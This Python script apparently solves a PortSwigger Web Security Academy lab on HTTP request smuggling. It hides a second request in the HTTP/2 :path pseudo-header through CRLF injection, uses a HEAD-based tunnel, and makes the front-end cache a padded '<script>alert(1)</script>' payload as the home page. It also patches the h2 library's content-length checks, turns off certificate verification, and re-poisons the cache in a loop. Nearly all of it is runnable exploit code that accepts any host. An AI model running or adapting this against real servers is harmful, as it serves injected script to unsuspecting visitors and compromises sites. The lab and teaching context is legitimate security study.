#!/usr/bin/env python3
"""
Web cache poisoning via HTTP/2 request tunnelling
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 20-h2-tunnelling-web-cache-poisoning.md

What this does:
    Hides a second request inside the :path pseudo-header -- a third
    distinct CRLF injection surface alongside header names and values, and
    one front-ends often forget to sanitize because it's syntactically a
    path, not a "header". Converts the tunnel to HEAD-based non-blind
    tunnelling: a HEAD response declares a Content-Length but has no body
    of its own, so if the front-end over-reads based on that declared
    length, the *tunnelled* request's response leaks back into the space
    that should have been empty.

    The tunnelled request targets /resources (a 302 redirect whose
    Location reflects the query string unencoded), with an XSS payload in
    the query string padded to roughly 8,500 characters so the tunnelled
    302 response exceeds the outer HEAD /'s declared Content-Length --
    otherwise the front-end times out waiting for bytes that never arrive.
    The front-end ends up caching the raw tunnelled response text -- script
    tag included -- as the content of the home page itself.

    Needs one extra fix beyond disabled header validation: the h2 library
    independently validates that a response body's length matches its
    declared Content-Length, and a HEAD response carrying unexpected
    tunnelled body data trips that check. Patching around it means
    disabling the library's own content-length tracking for the stream.

Usage:
    python 20-h2-tunnelling-web-cache-poisoning.py <lab-url>
    e.g. python 20-h2-tunnelling-web-cache-poisoning.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx h2
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_h2_connection(host: str, port: int = 443, timeout: float = 15.0):
    import h2.connection as h2c
    import h2.config as h2cfg

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=timeout)
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2cfg.H2Configuration(
        client_side=True, header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = h2c.H2Connection(config=config)
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(3)
    try:
        data = ssl_sock.recv(65535)
        conn.receive_data(data)
        ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass
    return ssl_sock, conn


def exploit_h2_tunnel_cache_poison(host: str, head_path: str = "/",
                                    xss_payload: str = "<script>alert(1)</script>",
                                    padding_len: int = 8500, port: int = 443) -> tuple:
    """Non-blind HEAD tunnel via CRLF in :path. Returns (status, body)."""
    import h2.events as h2e
    import h2.stream
    # Default h2 raises if a HEAD response's declared Content-Length doesn't
    # match what actually comes back -- exactly what happens here once the
    # tunnelled response's body rides along. Disable that tracking.
    h2.stream.H2Stream._track_content_length = lambda self, *args: None

    ssl_sock, conn = create_h2_connection(host, port, timeout=15)
    padding = "x" * padding_len
    tunnelled = f"/resources?{xss_payload}{padding}"
    path_value = f"{head_path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {tunnelled} HTTP/1.1\r\nFoo: bar"

    headers = [
        (":method", "HEAD"),
        (":path", path_value),
        (":authority", host),
        (":scheme", "https"),
    ]
    conn.send_headers(1, headers, end_stream=True)
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(15)
    result_data = b""
    status = 0
    try:
        while True:
            chunk = ssl_sock.recv(16384)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, h2e.ResponseReceived):
                    hdrs = {
                        k.decode() if isinstance(k, bytes) else k:
                        v.decode() if isinstance(v, bytes) else v
                        for k, v in event.headers
                    }
                    status = int(hdrs.get(":status", "0"))
                elif isinstance(event, h2e.DataReceived):
                    result_data += event.data
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2e.StreamEnded):
                    ssl_sock.sendall(conn.data_to_send())
                    raise StopIteration
            ssl_sock.sendall(conn.data_to_send())
    except (socket.timeout, StopIteration):
        pass
    ssl_sock.close()
    return status, result_data.decode(errors="replace")


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname
    print(f"[*] Poisoning / cache with tunnelled XSS on {host}...")

    for i in range(18):
        try:
            status, body = exploit_h2_tunnel_cache_poison(host, head_path="/")
            has_xss = "<script>alert(1)</script>" in body
            print(f"[{i + 1}] status={status} len={len(body)} xss_reflected={has_xss}")
        except Exception as e:
            print(f"[{i + 1}] Error: {e}")

        if i > 0 and i % 3 == 0:
            check = httpx.get(lab_url + "/", verify=False)
            if "is-solved" in check.text:
                print("[+] Lab solved!")
                return
        time.sleep(5)  # keep the cache poisoned faster than its max-age=30 window

    check = httpx.get(lab_url + "/", verify=False)
    print(f"[+] Solved: {'is-solved' in check.text}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
